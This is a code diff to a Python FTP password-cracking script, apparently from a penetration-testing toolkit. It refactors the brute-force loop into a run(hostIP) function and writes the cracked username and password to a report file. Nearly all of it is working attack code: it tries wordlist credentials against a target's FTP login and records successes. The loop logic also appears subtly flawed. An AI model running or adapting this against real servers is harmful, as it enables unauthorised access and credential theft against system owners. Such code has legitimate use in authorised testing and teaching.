@@ -4,16 +4,14 @@ from datetime import datetime
 
 def logfile(target,users,passw):
     try:
-        # Start time
-        t0 = datetime.now()
-        
+                
         ufile=open(users,'r')
         pfile=open(passw,'r')
         for user in ufile.readlines():
             for password in pfile.readlines():
                 if (bruteftp(target,user,password) is True):
                     break
-        exec(open("./ftpClient.py").read())
+        return user, password
     except Exception as e:
         print(e)
 
@@ -26,16 +24,7 @@ def bruteftp(target,users,passw):
         print('Trying with: '+user+" "+password)
         time.sleep(.010)
         ftp.login(user,password)
-        print('\n\nLogin succeeded with: '+user+" "+password)
-        
-        # End Time
-        t1 = datetime.now()
-        
-        # Calculate runtime
-        total =  t1 - t0
-        
-        # Generate Report
-        print ("Scanning Completed in: ", total, "\n")
+        print('\n\nLogin succeeded with: '+user+" "+password)                
         
         return True
 
@@ -57,16 +46,38 @@ def bruteftp(target,users,passw):
 
         print ('EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_o))
 
-host=hostIP
+def run(hostIP):
+    
+    host=hostIP
 
-#Print
-hostLength = 14-len(str(host))
-print ("*" * 60)
-print ("* PasswordCracker.py", " " * 38 + "*") 
-print ("* Please wait, attempting to crack password:", host + " " * hostLength + "*")
-print ("*" * 60)
-time.sleep(3)
+    #Print
+    hostLength = 14-len(str(host))
+    print ("*" * 60)
+    print ("* PasswordCracker.py", " " * 38 + "*") 
+    print ("* Please wait, attempting to crack password:", host + " " * hostLength + "*")
+    print ("*" * 60)
+    time.sleep(1)
 
-users="user.txt"
-passw="password.txt"
-logfile(host,users,passw)
+    # Start time
+    t0 = datetime.now()
+    
+    users="lists/user.txt"
+    passw="lists/password.txt"
+    user, password =logfile(host,users,passw)
+    
+    with open('report.txt', 'a') as f:
+        f.write("\nPasswordCracker.py\n")
+        f.write("-Credentials-\n")
+        f.write("\nUsername: " + user + "\n")
+        f.write("\nPassword: " + password + "\n")
+    
+    # End Time
+    t1 = datetime.now()
+    
+    # Calculate runtime
+    total =  t1 - t0
+    
+    # Generate Report
+    print ("Scanning Completed in: ", total, "\n")
+    
+    return user, password
